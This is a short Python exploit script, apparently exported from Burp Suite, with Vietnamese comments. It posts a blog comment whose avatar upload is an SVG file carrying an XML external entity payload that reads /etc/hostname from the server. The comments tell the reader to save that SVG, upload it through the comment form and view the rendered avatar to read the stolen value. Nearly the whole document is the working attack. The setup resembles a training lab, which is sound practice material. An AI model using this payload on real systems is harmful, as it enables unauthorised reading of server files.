import requests

burp0_url = "YOUR_HOST"
burp0_cookies = {"session": "YOUR_SESSION"}
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "multipart/form-data; boundary=----geckoformboundary854186b3596e0fc4f24d53cc2724458",
    "Origin": "YOUR_HOST",
    "Referer": "YOUR_HOST/post?postId=1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
    }
burp0_data = "------geckoformboundary854186b3596e0fc4f24d53cc2724458\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\nWXTd2w62UeCyoln16yAozW2nyKyT2ool\r\n------geckoformboundary854186b3596e0fc4f24d53cc2724458\r\nContent-Disposition: form-data; name=\"postId\"\r\n\r\n1\r\n------geckoformboundary854186b3596e0fc4f24d53cc2724458\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\ntest\r\n------geckoformboundary854186b3596e0fc4f24d53cc2724458\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\ntest\r\n------geckoformboundary854186b3596e0fc4f24d53cc2724458\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"xxe.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg width=\"500px\" height=\"100px\" xmlns=\"http://www.w3.org/2000/svg\">\n  <text font-size=\"20\" x=\"10\" y=\"40\">Hostname: &xxe;</text>\n</svg>\n\r\n------geckoformboundary854186b3596e0fc4f24d53cc2724458\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\ntest@gmail.com\r\n------geckoformboundary854186b3596e0fc4f24d53cc2724458\r\nContent-Disposition: form-data; name=\"website\"\r\n\r\nhttps://google.com\r\n------geckoformboundary854186b3596e0fc4f24d53cc2724458--\r\n"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

# tạo 1 file text chứa đoạn mã bên dưới và lưu nó dưới dạng svg (x.svg)
# ```
# <?xml version="1.0" standalone="yes"?>
# <!DOCTYPE svg [
#   <!ENTITY xxe SYSTEM "file:///etc/hostname">
# ]>
# <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg">
#   <text font-size="20" x="10" y="40">Hostname: &xxe;</text>
# </svg>
# ```

# upload file svg thông qua postcomment
# xem ảnh sau khi lấy được hostname tại "/post/comment/avatars?filename=1.png"